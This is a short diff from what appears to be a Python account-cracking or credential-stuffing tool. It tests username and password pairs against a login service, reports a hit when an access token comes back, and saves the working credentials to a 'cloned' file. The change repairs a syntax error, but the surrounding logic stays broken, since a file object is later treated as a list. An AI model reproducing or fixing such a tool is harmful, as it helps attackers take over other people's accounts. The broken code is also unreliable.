@@ -295,7 +295,7 @@ def action():
                                             q = json.load(data)
                                             if 'access_token' in q:
                                                 print("'\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5  ")
-                                                ok. = open('save/cloned.txt', 'a')
+                                                ok = open('save/cloned.txt', 'a')
                                                 ok.write(k+c+user+pass5+'\n')
                                                 ok.close()
                                                 ok.append(c+user+pass5)
